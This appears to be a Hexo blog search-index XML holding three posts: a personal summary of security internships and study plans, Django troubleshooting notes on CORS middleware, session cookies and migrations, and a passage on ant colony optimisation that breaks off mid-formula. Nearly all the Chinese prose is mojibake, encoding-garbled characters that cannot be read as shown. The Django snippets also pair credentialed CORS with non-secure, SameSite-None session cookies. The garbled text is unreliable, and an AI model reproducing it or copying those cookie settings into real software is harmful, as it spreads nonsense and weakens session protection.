è¿˜æ˜¯ä¸ä¹…ä¹‹å‰ï¼ˆä¸»è¦æ˜¯è¢« notion å’Œ è¯­é›€ æƒ¯æ‡’äº†ï¼‰â€¦</p><ul><li>2020.4 - 2020.10 æ¸—é€æµ‹è¯•å®ä¹ ç”Ÿï¼Œç®—æ˜¯æ­£å¼å…¥é—¨ç½‘å®‰å§â€¦æ„Ÿè°¢ç»„å†…å¤§ä½¬è‚¯æ”¶ç•™æˆ‘ä¸ªèœé¸¡ï¼Œå“ˆå“ˆï¼Œä¸€å¼€å§‹è¿˜å¾ˆçº ç»“ï¼Œä»¥åæ˜¯åšå®‰å…¨è¿˜æ˜¯è¿ç»´ï¼Œæ‰€ä»¥å„æŠ•äº†ä¸€ä»½å®ä¹ ï¼ˆåˆšè¿‡å®Œå¹´åšå¸ˆå…„çš„ç–¯ç‹‚å®‰åˆ©ä¸‹ï¼‰ï¼Œé¢è¯•å’Œå‡†å¤‡ï¼Œå‘ç°è¿˜æ˜¯å¯¹ç½‘å®‰æ›´æ•¢å…´è¶£ä¸€äº›~ï¼Œæ‰€ä»¥é€‰äº†ç½‘å®‰ã€‚ä¸è¿‡ç°åœ¨å¶å°”ä¼šæƒ³ï¼Œè¦æ˜¯å½“åˆæˆ‘é€‰äº†å¦å¤–ä¸€ä¸ªå®ä¹ ï¼Œç°åœ¨ä¼šæ€æ ·ï¼Ÿï¼ˆæ¯•ç«Ÿä¸¤è¾¹é¢è¯•éƒ½è¿‡äº†ï¼‰ï¼Œå®ä¹ è¿‡ç¨‹ä¸­è¢«å„ç§å¸¦é£ï¼Œè®¤è¯†äº†å‡ ä¸ªå¤§ä½¬ï¼Œå…¶ä¸­çš„é¡¹ç›®ç»éªŒï¼Œéƒ½ç»™ç§‹æ‹›æ‰“ä¸‹äº†åŸºç¡€ã€‚</li></ul><ul><li>2020.10 - 2020.12 å­¦æ ¡é¡¹ç›®ï¼Œæ¨¡ä»¿å¤§ä½¬çš„å¼€æºé¡¹ç›®ï¼Œç»“åˆæ·±åº¦å­¦ä¹ å’Œç½‘å®‰å’ŒåŒå­¦ä¸€èµ·åšäº†ä¸ªã€ŠåŸºäºA2Cå’ŒMSFçš„è‡ªé€‚åº”æ¸—é€æµ‹è¯•å·¥å…·ã€‹ï¼Œä½œä¸ºä»£ç å’Œæ–‡æ¡£çš„ä¸»è¦è´¡çŒ®è€…ï¼Œè™½ç„¶æ²¡åšåˆ°æƒ³è±¡ä¸­æ•ˆæœï¼Œä¸è¿‡ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡å°è¯•å»å­¦ä¹ å’Œæ”¹åŠ¨å¤§ä½¬çš„å¼€æºé¡¹ç›®ã€‚è™½ç„¶åŠŸèƒ½ä¸Šæ²¡èƒ½åšçš„å¾ˆå¥½ï¼ˆä¸è¿‡è¿˜æ˜¯åšäº†è®¸å¤šçš„ä¸é”™çš„ä¼˜åŒ–ï¼‰ï¼Œä½†æ˜¯ä»¥åå¯¹å¼€æºé¡¹ç›®éƒ½ä¸ä¼šæœ‰é‚£ç§é™Œç”Ÿçš„éš”ç¦»æ„Ÿäº†ï¼ˆå°±è¿™ä¸ªè¯­è¨€å­¦è¿‡ï¼Œä¹Ÿå†™è¿‡é¡¹ç›®ï¼Œä½†çœ‹ç€å¤§ä½¬å†™çš„å°±æ˜¯æœ‰ç‚¹æŠ½è±¡ï¼‰</li></ul><ul><li>2020.11 - 2021.3 å®‰å…¨æ”»é˜²ç ”ç©¶å®ä¹ ç”Ÿï¼Œç¬¬ä¸€æ¬¡åœ¨å¤§å‹é¡¹ç›®ä¸­æŠ€æœ¯ä¸Šæ‰¿æ‹…ä¸€å®šè§’è‰²ï¼ŒæŒ‘æˆ˜å¾ˆå¤§ï¼Œè¿‡äº†ä¸€ä¸ªæœˆæ‰ä¹ æƒ¯è¿™äº›å·¥ä½œï¼Œä¹‹å‰å®ä¹ ä¸»è¦æ˜¯æ¸—é€ï¼Œè¿™æ¬¡è¿˜æœ‰å¾ˆå¤šä»£ç å®¡è®¡ã€å°¤å…¶æ˜¯hvvç›¸å…³çš„ï¼Œä»£ç å®¡è®¡ä»»åŠ¡å¾ˆç¹é‡ï¼Œå¹³å‡ä¸€å¤©è¦å®¡ä¸ª6000+è¡Œä»£ç ï¼ˆè€Œä¸”è¿˜æ˜¯å„ç§è¯­è¨€ï¼Œæœ‰çš„å‹æ ¹å°±ä¸æ€ä¹ˆç†Ÿæ‚‰â€¦ï¼‰ã€‚ä¹Ÿåšäº†å¾ˆå¤šå°è¯•ï¼Œæ¯”å¦‚å¨èƒå»ºæ¨¡è¯„å®¡ï¼Œå®‰å…¨çº¢çº¿è½å®ç­‰ï¼Œä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡æ¥è§¦SDLï¼Œä¹Ÿç”±æ­¤çŸ¥é“ä¸ºå•¥å¤§å‚æ ¸å¿ƒä¸šåŠ¡æ¼æ´ä¼šéš¾æŒ–ï¼Œæ¯•ç«Ÿåˆ«äººéƒ½æœ‰åšSDLæµç¨‹ã€‚å½“ç„¶é™¤æ­¤ä¹‹å¤–ï¼Œç”±äºæˆ‘ä»¬éƒ¨é—¨å¾ˆçœ‹é‡äº§å‡ºï¼Œæ‰€ä»¥è¿™æ¬¡å®ä¹ ä¹Ÿæ²¡ä¸Šæ¬¡å®ä¹ é‚£ä¹ˆè½»æ¾ã€‚ç‰¹åˆ«æ˜¯æˆ‘è¿™ä¸ªäº§å“çº¿ï¼Œè¿­ä»£äº†å¾ˆå¤šä»£ï¼Œæ¼æ´ç‰¹åˆ«éš¾æŒ–ï¼Œè€Œä¸”æ¸—é€ä¹Ÿæ¯”è¾ƒéº»çƒ¦ï¼Œå› ä¸ºç¯å¢ƒæ¯”è¾ƒå¤æ‚ï¼Œæ²¡æœ‰åœ¨æç«™é‚£ä¼šéšéšä¾¿ä¾¿æŠ“ä¸ªåŒ…æ”¹æ”¹å‚æ•°é‚£ä¹ˆèˆ’æœäº†~ å½“ç„¶äº§å‡ºä¸ä»…ä»…æ˜¯æŒ–æ´ï¼Œè¿˜å¯ä»¥æœ‰å®‰å…¨ç ”ç©¶åˆ†äº«ï¼Œè¾“å‡ºæ–‡æ¡£ç­‰ç­‰ç­‰ç­‰~</li></ul><p>æ€»ä¹‹å°±æ˜¯ä»ä¹‹å‰å„ç§æ‰“æ‚åˆ°ç°åœ¨ä¼šç¨å¾®ä¸“æ³¨äºä¸€ä¸ªæ–¹å‘ï¼Œæ‰€ä»¥æˆé•¿ä¹ŸæŒºå¿«çš„ï¼Œè™½ç„¶è¿˜æ˜¯å¾ˆèœï¼ˆxï¼Œå…¶å®ä¸»è¦è¿˜æ˜¯è¢«å„ç§å¤§ä½¬å¸¦é£ï¼Œå°‘èµ°äº†ä¸€äº›å‘ ï¼ˆ</p><p>ä»Šå¹´ï¼Œè™½ç„¶è¿‡å¹´å¾ˆä¹…äº†ï¼Œå…ˆç«‹ä¸€äº› flag å§~ï¼Œæ¯•ç«Ÿå®ä¹ äº†ä¸¤æ¬¡ï¼Œå‘ç°ä¸€äº›ä¸œè¥¿éœ€è¦è¡¥è¡¥äº†</p><ul><li>SDLï¼ŒæŠŠå®ä¹ å­¦çš„åšä¸ªæ€»ç»“å¹¶åšä¸€äº›æ‹“å±•</li><li>äº‘å®‰å…¨ï¼Œå…ˆæŠŠå¨èƒå»ºæ¨¡å­¦ä¸ªå·®ä¸å¤šï¼Œç„¶åç†Ÿæ‚‰ä¸€æ³¢ä¸»æµçš„äº‘åŸºç¡€æ¡†æ¶ï¼Œæ¯•ç«Ÿå·¥ä½œè¦ç”¨åˆ°</li><li>äºŒè¿›åˆ¶ï¼Œå¸¸è§æ¼æ´ç‚¹å’Œåˆ©ç”¨æ–¹å¼è¦æŒæ¡ï¼Œæ„Ÿè§‰ç†Ÿæ‚‰äºŒè¿›åˆ¶ä»¥åå®¡è®¡C/C++ä¼šèˆ’æœä¸å°‘</li><li>ä»£ç å®¡è®¡ï¼ŒæŠŠç™½å«–è¿‡æ¥çš„CTFSHOWå…¥é—¨å¤§éƒ¨åˆ†ç»™åˆ·å®Œï¼Œå·©å›ºä¸€æ³¢åŸºç¡€~</li></ul><p>è¿Ÿäº›ä¼šæŠŠä¸€äº›æ­£å¸¸ç‚¹çš„ç¬”è®°æ”¾ä¸Šæ¥ï¼Œ2333</p>]]></content>
      
      
      <categories>
          
          <category> æ€»ç»“ </category>
          
          <category> å°è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°è®° </tag>
            
            <tag> æ€»ç»“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>djangoè¸©å‘è®°</title>
      <link href="2020/01/02/django%E8%B8%A9%E5%9D%91%E8%AE%B0/"/>
      <url>2020/01/02/django%E8%B8%A9%E5%9D%91%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="python-è™šæ‹Ÿç¯å¢ƒ"><a href="#python-è™šæ‹Ÿç¯å¢ƒ" class="headerlink" title="python è™šæ‹Ÿç¯å¢ƒ"></a>python è™šæ‹Ÿç¯å¢ƒ</h3><p>pip install virtualenv<br>pip install virtualenvwrapper-win # windows ä½¿ç”¨æ­¤å‘½ä»¤</p><p>å¥½å¤„,ï¼šå¯ä»¥ä¸€ä¸ªç¯å¢ƒå¯¹åº”ä¸€ä¸ªé¡¹ç›®</p><h3 id="é—­åŒ…"><a href="#é—­åŒ…" class="headerlink" title="é—­åŒ…"></a>é—­åŒ…</h3><p>ä¸€ç›´å¥½å¥‡é—­åŒ…æœ‰ä»€ä¹ˆç”¨ï¼Œç›´åˆ°å­¦äº† django åçš„ç™»å½•è£…é¥°å™¨</p><p>é—­åŒ…çš„åº”ç”¨ï¼šè£…é¥°å™¨ã€é¢å‘å¯¹è±¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">è£…é¥°å™¨çš„åº”ç”¨</span></span><br><span class="line"><span class="string">å¦‚æœéœ€è¦ç»Ÿè®¡ä¸€ä¸ªå‡½æ•°è¿è¡Œçš„æ—¶é—´ï¼ŒåŠ ä¸Šè£…é¥°å™¨å³å¯ï¼Œå¯ç®€åŒ–ä»£ç </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func_timer</span>(<span class="params">func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>():</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        func()</span><br><span class="line">        <span class="built_in">print</span>(time.time() - start_time)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@func_timer</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;login success!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">login()</span><br></pre></td></tr></table></figure><h3 id="è·¨åŸŸé—®é¢˜"><a href="#è·¨åŸŸé—®é¢˜" class="headerlink" title="è·¨åŸŸé—®é¢˜"></a>è·¨åŸŸé—®é¢˜</h3><p>åœ¨ä¸ setting.py åŒçº§ç›®å½•æ–°å»ºä¸€ä¸ª py æ–‡ä»¶ã€‚å†™å…¥å¦‚ä¸‹ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.utils.deprecation <span class="keyword">import</span> MiddlewareMixin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SolveCrossDomainMiddleware</span>(<span class="params">MiddlewareMixin</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_response</span>(<span class="params">self, request, response</span>):</span></span><br><span class="line">        response[<span class="string">&quot;Access-Control-Allow-Credentials&quot;</span>] = <span class="string">&quot;true&quot;</span></span><br><span class="line">        response[<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>] = <span class="string">&quot;http://192.168.123.60:8080&quot;</span></span><br><span class="line">        response[<span class="string">&quot;Access-Control-Allow-Methods&quot;</span>] = [<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span><br><span class="line">        <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="/img/Memo/django/django1.png" class="lazyload" data-srcset="/img/Memo/django/django1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="django1.png"></p><p>åœ¨ settingpy çš„ MIDDLEWARE å¼•å…¥ï¼Œ webproject ä¸è‡ªå·±çš„é¡¹ç›®åå­—å¯¹åº”ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;webproject.solveCrossDomain.SolveCrossDomainMiddleware&#x27;</span>,</span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="/img/Memo/django/django2.png" class="lazyload" data-srcset="/img/Memo/django/django2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="django2.png"></p><p>å³å¯è§£å†³è·¨åŸŸé—®é¢˜ï¼Œå› ä¸º SolveCrossDomainMiddleware ä¸­å·²ç»å¯¹ request å’Œ response åšäº†å¤„ç†äº†</p><h3 id="session-è·¨åŸŸé—®é¢˜"><a href="#session-è·¨åŸŸé—®é¢˜" class="headerlink" title="session è·¨åŸŸé—®é¢˜"></a>session è·¨åŸŸé—®é¢˜</h3><p>å› ä¸ºæˆ‘ä½¿ç”¨çš„æ˜¯ Vue.js + django å‰åç«¯åˆ†ç¦»ï¼Œå› æ­¤éœ€è¦è§£å†³ session è·¨åŸŸé—®é¢˜</p><h4 id="Vue-é‡ŒåŠ å…¥-å› ä¸ºæˆ‘ä½¿ç”¨çš„æ˜¯-axios"><a href="#Vue-é‡ŒåŠ å…¥-å› ä¸ºæˆ‘ä½¿ç”¨çš„æ˜¯-axios" class="headerlink" title="Vue é‡ŒåŠ å…¥ (å› ä¸ºæˆ‘ä½¿ç”¨çš„æ˜¯ axios"></a>Vue é‡ŒåŠ å…¥ (å› ä¸ºæˆ‘ä½¿ç”¨çš„æ˜¯ axios</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.$axios.defaults.withCredentials = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="/img/Demo/django/django6.png" class="lazyload" data-srcset="/img/Demo/django/django6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="django6.png"></p><h4 id="ä»¥ä¸‹ä¸º-django-é‡Œçš„æ“ä½œ"><a href="#ä»¥ä¸‹ä¸º-django-é‡Œçš„æ“ä½œ" class="headerlink" title="ä»¥ä¸‹ä¸º django é‡Œçš„æ“ä½œ"></a>ä»¥ä¸‹ä¸º django é‡Œçš„æ“ä½œ</h4><p>æˆ‘ä½¿ç”¨çš„æ˜¯ æ•°æ®åº“å­˜å‚¨ sessionï¼Œ å› æ­¤ setting.py å¼•å…¥çš„æ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">MIDDLEWARE = [</span><br><span class="line">...</span><br><span class="line"><span class="string">&#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;</span>,</span><br><span class="line">...</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">SESSION_ENGINE = <span class="string">&#x27;django.contrib.sessions.backends.db&#x27;</span>  <span class="comment"># å¼•æ“ï¼ˆé»˜è®¤ï¼‰</span></span><br><span class="line"></span><br><span class="line">SESSION_COOKIE_NAME = <span class="string">&quot;sessionid&quot;</span>                <span class="comment"># Sessionçš„cookieä¿å­˜åœ¨æµè§ˆå™¨ä¸Šæ—¶çš„keyï¼Œå³ï¼šsessionidï¼éšæœºå­—ç¬¦ä¸²ï¼ˆé»˜è®¤ï¼‰</span></span><br><span class="line">SESSION_COOKIE_PATH = <span class="string">&quot;/&quot;</span>                        <span class="comment"># Sessionçš„cookieä¿å­˜çš„è·¯å¾„ï¼ˆé»˜è®¤ï¼‰</span></span><br><span class="line">SESSION_COOKIE_DOMAIN = <span class="literal">None</span>                     <span class="comment"># Sessionçš„cookieä¿å­˜çš„åŸŸåï¼ˆé»˜è®¤ï¼‰</span></span><br><span class="line">SESSION_COOKIE_SECURE = <span class="literal">False</span>                    <span class="comment"># æ˜¯å¦Httpsä¼ è¾“cookieï¼ˆé»˜è®¤ï¼‰</span></span><br><span class="line">SESSION_COOKIE_HTTPONLY = <span class="literal">True</span>                   <span class="comment"># æ˜¯å¦Sessionçš„cookieåªæ”¯æŒhttpä¼ è¾“ï¼ˆé»˜è®¤ï¼‰</span></span><br><span class="line">SESSION_COOKIE_AGE = <span class="number">3600</span>                        <span class="comment"># Sessionçš„cookieå¤±æ•ˆæ—¥æœŸï¼ˆé»˜è®¤2å‘¨ï¼‰</span></span><br><span class="line">SESSION_EXPIRE_AT_BROWSER_CLOSE = <span class="literal">False</span>          <span class="comment"># æ˜¯å¦å…³é—­æµè§ˆå™¨ä½¿å¾—Sessionè¿‡æœŸï¼ˆé»˜è®¤ï¼‰</span></span><br><span class="line">SESSION_SAVE_EVERY_REQUEST = <span class="literal">False</span>               <span class="comment"># æ˜¯å¦æ¯æ¬¡è¯·æ±‚éƒ½ä¿å­˜Sessionï¼Œé»˜è®¤ä¿®æ”¹ä¹‹åæ‰ä¿å­˜ï¼ˆé»˜è®¤ï¼‰</span></span><br><span class="line"><span class="comment"># !!! è¿™ä¸ªä¸€å®šè¦åŠ .....</span></span><br><span class="line">SESSION_COOKIE_SAMESITE = <span class="literal">None</span>                   <span class="comment"># é»˜è®¤ä¸º Lax, å³ get å¯è·¨åŸŸ, è€Œ post ä¸å¯ä»¥</span></span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹å›¾çº¢çº¿åŒºæ‰€ç¤º</p><p><img src="/img/Memo/django/django3.png" class="lazyload" data-srcset="/img/Memo/django/django3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="django3.png"></p><p>åœ¨ Vue.js å‰ç«¯å¼•å…¥</p><h3 id="migrate-æ— æŠ¥é”™ï¼Œè¿ç§»åæ•°æ®åº“æ²¡æœ‰å¢åŠ è¡¨"><a href="#migrate-æ— æŠ¥é”™ï¼Œè¿ç§»åæ•°æ®åº“æ²¡æœ‰å¢åŠ è¡¨" class="headerlink" title="migrate æ— æŠ¥é”™ï¼Œè¿ç§»åæ•°æ®åº“æ²¡æœ‰å¢åŠ è¡¨"></a>migrate æ— æŠ¥é”™ï¼Œè¿ç§»åæ•°æ®åº“æ²¡æœ‰å¢åŠ è¡¨</h3><p>æˆ‘æ˜¯æ‰‹åŠ¨ç›´æ¥åˆ é™¤äº† migrations é‡Œé¢çš„æ–‡ä»¶å’Œæ•°æ®åº“é‡Œé¢çš„è¡¨æ ¼ï¼Œï¼Œç„¶åæˆ‘æ”¹äº† models.py å makemigrations &amp;&amp; migrate æ•°æ®åº“ç«Ÿç„¶æ²¡æœ‰å¤šå‡ºè¡¨ã€‚</p><p><img src="/img/Memo/django/django4.png" class="lazyload" data-srcset="/img/Memo/django/django4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="django4.png"></p><p>åŸæ¥ django æ•°æ®åº“é‡Œé¢ï¼Œæ˜¯æœ‰è¿™ä¸ªè¡¨æ ¼çš„</p><p><img src="/img/Memo/django/django5.png" class="lazyload" data-srcset="/img/Memo/django/django5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="django5.png"></p><p>é‡Œé¢å­˜æ”¾ç€å…³äºæ•°æ®åº“è¿ç§»çš„ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘æ‰‹åŠ¨åˆ é™¤äº†è¿ç§»è¡¨å’Œæ•°æ®åå¹¶æ²¡æœ‰ä»€ä¹ˆä¹±ç”¨ï¼Œæ•°æ®åº“ä»¥ä¸ºå®ƒè¿˜æ˜¯åœ¨çš„ï¼Œï¼Œæ‰€ä»¥ï¼Œæˆ‘é€‰æ‹©äº†åˆ é™¤æ‰€ä»¥è¡¨æ ¼ï¼Œï¼Œé‡æ–° makemigrations &amp;&amp; migrate å°±å¥½äº†ã€‚</p><h4 id="å› ä¸ºè¿™æ˜¯ä¸ªäººä½œä¸šï¼Œï¼Œæ‰€ä»¥éšä¾¿åˆ äº†ï¼Œç”Ÿäº§ç¯å¢ƒæ…ç”¨ã€‚ã€‚ã€‚"><a href="#å› ä¸ºè¿™æ˜¯ä¸ªäººä½œä¸šï¼Œï¼Œæ‰€ä»¥éšä¾¿åˆ äº†ï¼Œç”Ÿäº§ç¯å¢ƒæ…ç”¨ã€‚ã€‚ã€‚" class="headerlink" title="å› ä¸ºè¿™æ˜¯ä¸ªäººä½œä¸šï¼Œï¼Œæ‰€ä»¥éšä¾¿åˆ äº†ï¼Œç”Ÿäº§ç¯å¢ƒæ…ç”¨ã€‚ã€‚ã€‚**"></a>å› ä¸ºè¿™æ˜¯ä¸ªäººä½œä¸šï¼Œï¼Œæ‰€ä»¥éšä¾¿åˆ äº†ï¼Œç”Ÿäº§ç¯å¢ƒæ…ç”¨ã€‚ã€‚ã€‚**</h4>]]></content>
      
      
      <categories>
          
          <category> å¼€å‘ </category>
          
          <category> Python </category>
          
          <category> Django </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¼€å‘ </tag>
            
            <tag> Python </tag>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æ™ºèƒ½å®éªŒ</title>
      <link href="2019/12/04/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD%E5%AE%9E%E9%AA%8C/"/>
      <url>2019/12/04/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="èšç¾¤ç®—æ³•"><a href="#èšç¾¤ç®—æ³•" class="headerlink" title=":) èšç¾¤ç®—æ³•"></a>:) èšç¾¤ç®—æ³•</h2><h3 id="ASæ±‚è§£-TSP-å‚æ•°ä¸€è§ˆ-è®¾ä»»æ„ä¸¤ä¸ªåŸå¸‚çš„è·ç¦»-d-ij-ä¸ºæ¬§å‡ é‡Œå¾·è·ç¦»"><a href="#ASæ±‚è§£-TSP-å‚æ•°ä¸€è§ˆ-è®¾ä»»æ„ä¸¤ä¸ªåŸå¸‚çš„è·ç¦»-d-ij-ä¸ºæ¬§å‡ é‡Œå¾·è·ç¦»" class="headerlink" title="ASæ±‚è§£ TSP å‚æ•°ä¸€è§ˆ(è®¾ä»»æ„ä¸¤ä¸ªåŸå¸‚çš„è·ç¦» $d_{ij}$ ä¸ºæ¬§å‡ é‡Œå¾·è·ç¦»)"></a>ASæ±‚è§£ TSP å‚æ•°ä¸€è§ˆ(è®¾ä»»æ„ä¸¤ä¸ªåŸå¸‚çš„è·ç¦» $d_{ij}$ ä¸ºæ¬§å‡ é‡Œå¾·è·ç¦»)</h3><ul><li>AS ä¸­çš„éšæœºæ¯”ä¾‹è§„åˆ™(random proportional): å¯¹äºæ¯åªèš‚èš k,<br>  è·¯å¾„è®°å¿†å‘é‡ $R^{k}$ æŒ‰ç…§è®¿é—®é¡ºåºè®°å½•äº†æ‰€æœ‰ k å·²ç»ç»è¿‡çš„ç¨‹åºåºå·</li></ul><br><ul><li>$ \tau_{o}(i, j) = \frac{m}{C^{nn}} $, mæ˜¯èš‚èšä¸ªæ•°, $C^{nn}$ æ˜¯ç”±è´ªå©ªç®—æ³•æ„é€ çš„è·¯å¾„çš„é•¿åº¦</li></ul><br><ul><li>è®¾èš‚èš k å½“å‰æ‰€åœ¨åŸå¸‚ä¸º i, åˆ™å…¶é€‰æ‹©åŸå¸‚ j ä½œä¸ºä¸‹ä¸€ä¸ªè®¿é—®å¯¹è±¡çš„æ¦‚ç‡ä¸º:</li></ul><p>$$<br>p_{k}(i,j) = \begin{cases}<br>\frac{[\tau(i, j) ]^{\alpha} [\eta(i, j)^{\beta } ]}{\sum_{u \in J_{k}(i)  }[\tau(i, u) ]^{\alpha} [\eta(i, u)^{\beta } ]} &amp; \text , ; j \in J_{k}(i) \<br>;;;;;;;;;;;; 0 &amp; \text , ; other<br>\end{cases}<br>$$</p><ul><li><ul><li>$J_{k}(i)$ è¡¨ç¤ºä»åŸå¸‚ i å¯ä»¥ç›´æ¥åˆ°è¾¾çš„ä¸”åˆä¸åœ¨èš‚èšè®¿é—®è¿‡çš„åŸå¸‚åºåˆ— $R^{k}$ ä¸­çš„åŸå¸‚é›†åˆ</li><li>$\eta(i, j)$ æ˜¯ä¸€ä¸ªå¯å‘å¼ä¿¡æ¯, é€šå¸¸ç”± $\eta(i, j) = \frac{1}{d_{ij}}$ ç›´æ¥è®¡ç®—</li><li>$\tau(i, j)$ è¡¨ç¤ºè¾¹ (i, j) ä¸Šçš„ä¿¡æ¯ç´ é‡</li><li>$\alpha$ å’Œ $\beta $ æ˜¯ä¸¤ä¸ªé¢„å…ˆè®¾ç½®çš„å‚æ•°, å®éªŒè¡¨æ˜ $\alpha$ = 1, $\beta $ = 2 ~ 5 æ¯”è¾ƒåˆé€‚</li></ul></li></ul><br><ul><li>åŸå¸‚ i ä¸ åŸå¸‚ j çš„ç›¸è¿è¾¹ä¸Šçš„ä¿¡æ¯ç´ é‡ $\tau_(i, j)$ æŒ‰å¦‚ä¸‹å…¬å¼è¿›è¡Œæ›´æ–°:</li></ul><p>$$<br>\tau(i, j) = (1 - \rho) \cdot \tau(i, j) + \sum_{ k=1 }^{m} \Delta \tau_{k}(i, j)<br>\<br>\Delta \tau_{k}(i, j) = \begin{cases}<br>(C_{k})^{-1} &amp; , ; (i, j) \in R^{k} \<br>0 &amp; ,; other<br>\end{cases}<br>$$</p><ul><li><ul><li>m æ˜¯èš‚èšä¸ªæ•°</li><li>$\rho$ æ˜¯ä¿¡æ¯ç´ çš„è’¸å‘ç‡, è§„å®š $0 &lt; \rho \leqslant 1 $ , $\rho$ é€šå¸¸è®¾ç½®ä¸º = 0.5</li><li>$\Delta \tau_{k}(i, j)$ æ˜¯ç¬¬ k 